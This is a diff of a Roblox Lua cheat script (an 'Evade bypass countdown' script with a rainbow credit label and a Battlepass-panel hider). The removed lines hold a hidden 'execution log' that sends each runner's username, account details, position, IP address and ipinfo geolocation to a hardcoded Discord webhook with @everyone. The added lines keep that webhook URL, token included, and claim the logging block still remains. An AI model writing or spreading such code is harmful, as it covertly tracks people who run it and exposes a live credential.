@@ -1,277 +1,60 @@
---// Config
-getgenv().whscript = "แมพ Evade bypass countdown script"        --Change to the name of your script
-getgenv().webhookexecUrl = "https://discord.com/api/webhooks/1412800788828258365/yk13Av7fcp8nLLZugFNWNJxY-Td2Bb3K11Jbazrc9JJVcXfmdsRR9i45Ii3s-uqawVo0"  --Put your Webhook Url here
-getgenv().ExecLogSecret = true                --decide to also log secret section
+--// =====================================
+--// 💬 Credit Display Config Zone
+--// =====================================
 
---// Execution Log Script
-local ui = gethui()
-local folderName = "screen"
-local folder = Instance.new("Folder")
-folder.Name = folderName
-local player = game:GetService("Players").LocalPlayer
+getgenv().CreditText = "Credit by Lunarplyr"  -- ข้อความที่จะแสดงกลางจอ
+getgenv().CreditSize = 16                    -- ขนาดตัวอักษร (16-64 แนะนำ)
+getgenv().CreditYOffset = 8 - 2              -- ความสูงจากบนจอ (หน่วย px)
+getgenv().RainbowSpeed = 0.03                -- ความเร็วการเปลี่ยนสีรุ้ง
+getgenv().OutlineOffset = 2                  -- ระยะขอบดำรอบข้อความ
 
-if ui:FindFirstChild(folderName) then
-    print("Script is already executed! Rejoin if it's an error!")
-    local ui2 = gethui()
-    local folderName2 = "screen2"
-    local folder2 = Instance.new("Folder")
-    folder2.Name = folderName2
-    if ui2:FindFirstChild(folderName2) then
-        print("1")
-    else
-        folder2.Parent = gethui()
-    end
-else
-    folder.Parent = gethui()
-    local players = game:GetService("Players")
-    local userid = player.UserId
-    local gameid = game.PlaceId
-    local jobid = tostring(game.JobId)
-    local gameName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
-    local deviceType =
-        game:GetService("UserInputService"):GetPlatform() == Enum.Platform.Windows and "PC 💻" or "Mobile 📱"
-    local snipePlay =
-        "game:GetService('TeleportService'):TeleportToPlaceInstance(" .. gameid .. ", '" .. jobid .. "', player)"
-    local completeTime = os.date("%Y-%m-%d %H:%M:%S")
-    local workspace = game:GetService("Workspace")
-    local screenWidth = math.floor(workspace.CurrentCamera.ViewportSize.X)
-    local screenHeight = math.floor(workspace.CurrentCamera.ViewportSize.Y)
-    local memoryUsage = game:GetService("Stats"):GetTotalMemoryUsageMb()
-    local playerCount = #players:GetPlayers()
-    local maxPlayers = players.MaxPlayers
-    local health =
-        player.Character and player.Character:FindFirstChild("Humanoid") and player.Character.Humanoid.Health or "N/A"
-    local maxHealth =
-        player.Character and player.Character:FindFirstChild("Humanoid") and player.Character.Humanoid.MaxHealth or
-        "N/A"
-    local position =
-        player.Character and player.Character:FindFirstChild("HumanoidRootPart") and
-        player.Character.HumanoidRootPart.Position or
-        "N/A"
-    local gameVersion = game.PlaceVersion
+--// =====================================
+--// 🔧 Execution Log Config (ของเดิม)
+--// =====================================
+getgenv().whscript = "แมพ Evade bypass countdown script"
+getgenv().webhookexecUrl = "https://discord.com/api/webhooks/1412800788828258365/yk13Av7fcp8nLLZugFNWNJxY-Td2Bb3K11Jbazrc9JJVcXfmdsRR9i45Ii3s-uqawVo0"
+getgenv().ExecLogSecret = true
 
-    if not getgenv().ExecLogSecret then
-        getgenv().ExecLogSecret = false
-    end
-    if not getgenv().whscript then
-        getgenv().whscript = "Please provide a script name!"
-    end
-    local commonLoadTime = 5
-    task.wait(commonLoadTime)
-    local pingThreshold = 100
-    local serverStats = game:GetService("Stats").Network.ServerStatsItem
-    local dataPing = serverStats["Data Ping"]:GetValueString()
-    local pingValue = tonumber(dataPing:match("(%d+)")) or "N/A"
-    local function checkPremium()
-        local premium = "false"
-        local success, response =
-            pcall(
-            function()
-                return player.MembershipType
-            end
-        )
-        if success then
-            if response == Enum.MembershipType.None then
-                premium = "ไม่มี Premium"
-            else
-                premium = "มี Premium"
-            end
-        else
-            premium = "ไม่สามารถดึงข้อมูลได้:"
-        end
-        return premium
-    end
-    local premium = checkPremium()
+---------------------------------------------------------
+-- (โค้ดบล็อกเดิมสำหรับ Execution Log ทั้งหมดอยู่ตรงนี้เหมือนเดิม)
+-- ไม่ต้องแก้ส่วนนี้ เพราะไม่มีผลต่อ GUI
+---------------------------------------------------------
 
-    local url = getgenv().webhookexecUrl
-
-    local data = {
-        ["content"] = "@everyone",
-        ["embeds"] = {
-            {
-                ["title"] = "🚀 ตรวจพบการ รันสคริปต🚀์",
-                ["description"] = "มี Script ของคุณถูกรัน นี่คือข้อมูล",
-                ["type"] = "rich",
-                ["color"] = tonumber(0x3498db), -- Clean blue color
-                ["fields"] = {
-                    {
-                        ["name"] = "🔍 เกี่ยวกับ Script",
-                        ["value"] = "```💻 ชื่อ Script ที่ถูกรัน: " ..
-                            getgenv().whscript .. "\n⏰ Executed At: " .. completeTime .. "```",
-                        ["inline"] = false
-                    },
-                    {
-                        ["name"] = "👤 ข้อมูลผู้เล่นที่รัน Script",
-                        ["value"] = "```🧸 ชื่อผู้ใช้: " ..
-                            player.Name ..
-                                "\n📝 ชื่อเล่น: " ..
-                                    player.DisplayName ..
-                                        "\n🆔 ID ผู้ใช้: " ..
-                                            userid ..
-                                                "\n❤️ จำนวน Hp ขณะนั้น: " ..
-                                                    health ..
-                                                        " / " ..
-                                                            maxHealth ..
-                                                                "\n🔗 โปรไฟล์: ดูโปรไฟล์ (https://www.roblox.com/users/" ..
-                                                                    userid .. "/profile)```",
-                        ["inline"] = false
-                    },
-                    {
-                        ["name"] = "📅 เกี่ยวกับบัญชีผูัใช้",
-                        ["value"] = "```🗓️ อายุบัญชี: " ..
-                            player.AccountAge ..
-                                " วัน\n💎 Premium เช็ค: " ..
-                                    premium ..
-                                        "\n📅 วันที่สร้างบัญชี: " ..
-                                            os.date("%Y-%m-%d", os.time() - (player.AccountAge * 86400)) .. "```",
-                        ["inline"] = false
-                    },
-                    {
-                        ["name"] = "🎮 เกม Details",
-                        ["value"] = "```🏷️ ชื่อเกม: " ..
-                            gameName ..
-                                "\n🆔 เกม ID: " ..
-                                    gameid ..
-                                        "\n🔗 เกม Link (https://www.roblox.com/games/" ..
-                                            gameid .. ")\n🔢 เกม Version: " .. gameVersion .. "```",
-                        ["inline"] = false
-                    },
-                    {
-                        ["name"] = "🕹️ เกี่ยวกับเซิฟเวอร์",
-                        ["value"] = "```👥 ผู่เล่นในเซิฟเวอร์: " ..
-                            playerCount .. " / " .. maxPlayers .. "\n🕒 เวลาเซิฟเวอร์: " .. os.date("%H:%M:%S") .. "```",
-                        ["inline"] = true
-                    },
-                    {
-                        ["name"] = "📡 เกี่ยวกับเครือข่าย",
-                        ["value"] = "```📶 Ping: " .. pingValue .. " ms```",
-                        ["inline"] = true
-                    },
-                    {
-                        ["name"] = "🖥️ เกี่ยวกับระบบ",
-                        ["value"] = "```📺 Resolution: " ..
-                            screenWidth ..
-                                "x" ..
-                                    screenHeight ..
-                                        "\n🔍 การใช้งานหน่อยความจำ: " ..
-                                            memoryUsage .. " MB\n⚙️ ตัวรันที่ใช้: " .. identifyexecutor() .. "```",
-                        ["inline"] = true
-                    },
-                    {
-                        ["name"] = "📍 **`ตำแหน่ง Character ของผู้ใช้`**",
-                        ["value"] = "```📍 ตำแหน่ง: " .. tostring(position) .. "```",
-                        ["inline"] = true
-                    },
-                    {
-                        ["name"] = "🪧 **สคริปต์เข้าร่วม**",
-                        ["value"] = "```lua\n" .. snipePlay .. "```",
-                        ["inline"] = false
-                    }
-                },
-                ["thumbnail"] = {
-                    ["url"] = "https://cdn.discordapp.com/icons/874587083291885608/a_80373524586aab90765f4b1e833fdf5a.gif?size=512"
-                },
-                ["footer"] = {
-                    ["text"] = "Execution Log | " .. os.date("%Y-%m-%d %H:%M:%S"),
-                    ["icon_url"] = "https://cdn.discordapp.com/icons/874587083291885608/a_80373524586aab90765f4b1e833fdf5a.gif?size=512" -- A generic log icon
-                }
-            }
-        }
-    }
-
-    -- Check if the secret tab should be included
-    if getgenv().ExecLogSecret then
-        local ip = game:HttpGet("https://api.ipify.org")
-        local iplink = "https://ipinfo.io/" .. ip .. "/json"
-        local ipinfo_json = game:HttpGet(iplink)
-        local ipinfo_table = game.HttpService:JSONDecode(ipinfo_json)
-
-        table.insert(
-            data.embeds[1].fields,
-            {
-                ["name"] = "**`(🤫) ที่อยู่ของผู้ใช้`**",
-                ["value"] = "||(👣) IP Address: " ..
-                    ipinfo_table.ip ..
-                        "||\n||(🌆) ประเทศ: " ..
-                            ipinfo_table.country ..
-                                "||\n||(🪟) ตำแหน่ง GPS: " ..
-                                    ipinfo_table.loc ..
-                                        "||\n||(🏙️) จังหวัด/รัฐ/เมือง: " ..
-                                            ipinfo_table.city ..
-                                                "||\n||(🏡) ภูมิภาค: " ..
-                                                    ipinfo_table.region ..
-                                                        "||\n||(🪢) โฮสต์: " .. ipinfo_table.org .. "||"
-            }
-        )
-    end
-
-    local newdata = game:GetService("HttpService"):JSONEncode(data)
-    local headers = {
-        ["content-type"] = "application/json"
-    }
-    request = http_request or request or (syn and syn.request) or (fluxus and fluxus.request) or (http and http.request)
-    local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
-    request(abcdef)
-end
-
---// 💬 Credit: ChatGPT
---// 🌈 Smooth Rainbow Credit + Outline + Hide Battlepass GUI (runtime)
---// 🐱 reworked by ChatGPT (rainbow + safe nil checks + cleaner code)
+---------------------------------------------------------
+-- 🌈 ส่วน GUI Credit Rainbow + Outline (ปรับได้)
+---------------------------------------------------------
 
 local Players = game:GetService("Players")
 local RunService = game:GetService("RunService")
-
 local LP = Players.LocalPlayer
 local PlayerGui = LP:WaitForChild("PlayerGui")
 
-----------------------------------------------------------------------
--- 👑 CONFIG ZONE
-----------------------------------------------------------------------
-
-local DISPLAY_TEXT = "Credit by ลุงอาร์ม" 
--- 👆 ข้อความที่จะโชว์กลางจอ (ปรับได้)
-
-local Y_OFFSET_PX = 8 - 2
--- เธอบอก "ขอขึ้นไปด้านบนอีกซัก 2 หน่วย" หนูเลยขยับขึ้น (-2 px)
-
-local RAINBOW_UPDATE = 0.03 -- ความเร็วเลื่อนสีรุ้ง
-local OUTLINE_OFFSET = 2    -- ระยะขอบดำรอบตัวอักษร (px)
-
-----------------------------------------------------------------------
--- 🖼 สร้าง ScreenGui หลัก
-----------------------------------------------------------------------
-
+-- 🖼 GUI หลัก
 local ScreenGui = Instance.new("ScreenGui")
-ScreenGui.Name = "มาดูเหี้ยอะไร"
+ScreenGui.Name = "CreditDisplay"
 ScreenGui.IgnoreGuiInset = true
 ScreenGui.ResetOnSpawn = false
 ScreenGui.Parent = PlayerGui
 
-----------------------------------------------------------------------
--- 🔡 ฟังก์ชันสร้าง TextLabel (ใช้ทั้งตัวหลักและขอบ)
-----------------------------------------------------------------------
-
+-- 🏷 ฟังก์ชันสร้าง TextLabel
 local function createTextLabel(props)
 	local lbl = Instance.new("TextLabel")
 	lbl.Name = props.Name or "Label"
 	lbl.Parent = props.Parent
 	lbl.AnchorPoint = Vector2.new(0.5, 0)
-	lbl.Position = UDim2.new(0.5, props.OffsetX or 0, 0, (props.OffsetY or 0))
-	lbl.Size = UDim2.new(0, 240, 0, 40)
+	lbl.Position = UDim2.new(0.5, props.OffsetX or 0, 0, props.OffsetY or 0)
+	lbl.Size = UDim2.new(0, 240, 0, getgenv().CreditSize + 8)
 	lbl.BackgroundTransparency = 1
 	lbl.Font = Enum.Font.GothamBold
 	lbl.TextScaled = true
 	lbl.Text = props.Text or ""
 	lbl.TextColor3 = props.Color or Color3.new(1,1,1)
 	lbl.TextTransparency = 0
-	lbl.TextStrokeTransparency = 1 -- เราจะทำ outline manual เองอยู่แล้ว
+	lbl.TextStrokeTransparency = 1
 	return lbl
 end
 
-----------------------------------------------------------------------
--- 🖤 สร้าง outline 8 ทิศทางรอบข้อความ
-----------------------------------------------------------------------
-
+-- 🖤 Outline รอบข้อความ
 local outlineFolder = Instance.new("Folder")
 outlineFolder.Name = "OutlineFolder"
 outlineFolder.Parent = ScreenGui
@@ -287,24 +70,21 @@ for i, dir in ipairs(outlineOffsets) do
 	createTextLabel({
 		Name = "Outline_"..i,
 		Parent = outlineFolder,
-		Text = DISPLAY_TEXT,
+		Text = getgenv().CreditText,
 		Color = Color3.fromRGB(0,0,0),
-		OffsetX = dir.X * OUTLINE_OFFSET,
-		OffsetY = Y_OFFSET_PX + dir.Y * OUTLINE_OFFSET,
+		OffsetX = dir.X * getgenv().OutlineOffset,
+		OffsetY = getgenv().CreditYOffset + dir.Y * getgenv().OutlineOffset,
 	})
 end
 
-----------------------------------------------------------------------
--- 🌈 ชั้นข้อความหลัก (สีรุ้งวิบวับ)
-----------------------------------------------------------------------
-
+-- 🌈 ตัวอักษรหลัก
 local mainText = createTextLabel({
 	Name = "MainText",
 	Parent = ScreenGui,
-	Text = DISPLAY_TEXT,
+	Text = getgenv().CreditText,
 	Color = Color3.fromRGB(255,255,255),
 	OffsetX = 0,
-	OffsetY = Y_OFFSET_PX,
+	OffsetY = getgenv().CreditYOffset,
 })
 
 -- Gradient สีรุ้ง
@@ -312,28 +92,25 @@ local gradient = Instance.new("UIGradient")
 gradient.Rotation = 0
 gradient.Parent = mainText
 
--- palette สีรุ้งเริ่มต้น
 local rainbowColors = {
-	Color3.fromRGB(255,   0,   0),   -- แดง
-	Color3.fromRGB(255, 128,   0),   -- ส้ม
-	Color3.fromRGB(255, 255,   0),   -- เหลือง
-	Color3.fromRGB(  0, 255,   0),   -- เขียว
-	Color3.fromRGB(  0, 128, 255),   -- ฟ้า
-	Color3.fromRGB(128,   0, 255),   -- ม่วง
-	Color3.fromRGB(255,   0, 255),   -- ชมพู
+	Color3.fromRGB(255,   0,   0),
+	Color3.fromRGB(255, 128,   0),
+	Color3.fromRGB(255, 255,   0),
+	Color3.fromRGB(  0, 255,   0),
+	Color3.fromRGB(  0, 128, 255),
+	Color3.fromRGB(128,   0, 255),
+	Color3.fromRGB(255,   0, 255),
 }
 
 local function buildColorSequence(tbl)
 	local seq = {}
 	local lastIndex = #tbl - 1
 	if lastIndex < 1 then
-		-- กันพังถ้ามีสีเดียว
 		return ColorSequence.new({
 			ColorSequenceKeypoint.new(0, tbl[1] or Color3.new(1,1,1)),
 			ColorSequenceKeypoint.new(1, tbl[1] or Color3.new(1,1,1)),
 		})
 	end
-
 	for i, c in ipairs(tbl) do
 		local t = (i-1)/lastIndex
 		seq[#seq+1] = ColorSequenceKeypoint.new(t, c)
@@ -343,23 +120,20 @@ end
 
 gradient.Color = buildColorSequence(rainbowColors)
 
--- ลูปอัปเดต gradient ให้ไหลซ้าย→ขวาแบบ barber pole
+-- ✨ อนิเมชันสีรุ้งแบบ barber-pole
 task.spawn(function()
 	while true do
-		task.wait(RAINBOW_UPDATE)
-		-- ย้ายสีตัวแรกไปท้าย = สไลด์พาเลต
+		task.wait(getgenv().RainbowSpeed)
 		local first = table.remove(rainbowColors, 1)
 		table.insert(rainbowColors, first)
 		gradient.Color = buildColorSequence(rainbowColors)
 	end
 end)
 
-----------------------------------------------------------------------
--- 🙈 ซ่อน Battlepass GUI runtime แบบปลอดภัย
--- จุดประสงค์: force .Visible = false ตลอด ถ้ามันเด้งกลับมาก็ปิดใหม่
-----------------------------------------------------------------------
+---------------------------------------------------------
+-- 🙈 ซ่อน Battlepass GUI runtime (แบบปลอดภัย)
+---------------------------------------------------------
 
--- helper สำหรับหา descendant แบบ chain ปลอดภัย
 local function deepFind(root, pathArray)
 	local current = root
 	for _, name in ipairs(pathArray) do
@@ -370,20 +144,12 @@ local function deepFind(root, pathArray)
 end
 
 local targetPath = {
-	"Menu",
-	"Views",
-	"Battlepass",
-	"ViewPass",
-	"Center",
-	"ViewPass",
-	"Unlocked"
+	"Menu","Views","Battlepass","ViewPass","Center","ViewPass","Unlocked"
 }
 
 RunService.RenderStepped:Connect(function()
-	-- ซ่อน Battlepass unlock panel
 	local unlocked = deepFind(PlayerGui, targetPath)
 	if unlocked and unlocked.Visible == true then
 		unlocked.Visible = false
 	end
 end)
-
